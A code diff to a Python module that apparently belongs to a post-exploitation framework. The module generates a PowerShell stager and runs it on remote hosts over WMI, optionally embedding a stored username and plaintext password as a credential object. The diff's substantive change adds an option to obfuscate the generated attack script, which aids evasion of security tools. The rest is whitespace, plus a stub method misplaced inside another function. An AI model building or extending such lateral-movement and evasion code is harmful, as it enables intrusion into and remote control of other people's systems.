@@ -1,3 +1,4 @@
+import os.path
 from lib.common import helpers
 
 class Module:
@@ -14,13 +15,13 @@ class Module:
             'Background' : False,
 
             'OutputExtension' : None,
-            
+
             'NeedsAdmin' : False,
 
             'OpsecSafe' : True,
 
             'MinPSVersion' : '2',
-            
+
             'Comments': []
         }
 
@@ -36,7 +37,7 @@ class Module:
             'CredID' : {
                 'Description'   :   'CredID from the store to use.',
                 'Required'      :   False,
-                'Value'         :   ''                
+                'Value'         :   ''
             },
             'ComputerName' : {
                 'Description'   :   'Host[s] to execute the stager on, comma separated.',
@@ -86,8 +87,8 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
-        
+    def generate(self, obfuscate=False, obfuscationCommand=""):
+
         listenerName = self.options['Listener']['Value']
         userAgent = self.options['UserAgent']['Value']
         proxy = self.options['Proxy']['Value']
@@ -101,7 +102,7 @@ class Module:
         # if a credential ID is specified, try to parse
         credID = self.options["CredID"]['Value']
         if credID != "":
-            
+
             if not self.mainMenu.credentials.is_credential_valid(credID):
                 print helpers.color("[!] CredID is invalid!")
                 return ""
@@ -141,6 +142,14 @@ class Module:
                 if userName != '':
                     script = "$PSPassword = \""+password+"\" | ConvertTo-SecureString -asPlainText -Force;$Credential = New-Object System.Management.Automation.PSCredential(\""+userName+"\",$PSPassword);" + script + " -Credential $Credential"
 
+                if obfuscate:
+                    script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
+
                 script += ";'Invoke-Wmi executed on " +computerNames +"'"
-            
+
+            if obfuscate:
+                script = helpers.obfuscate(psScript=script, installPath=self.mainMenu.installPath, obfuscationCommand=obfuscationCommand)
             return script
+
+        def obfuscate(self, obfuscationCommand="", forceReobfuscation=False):
+            return
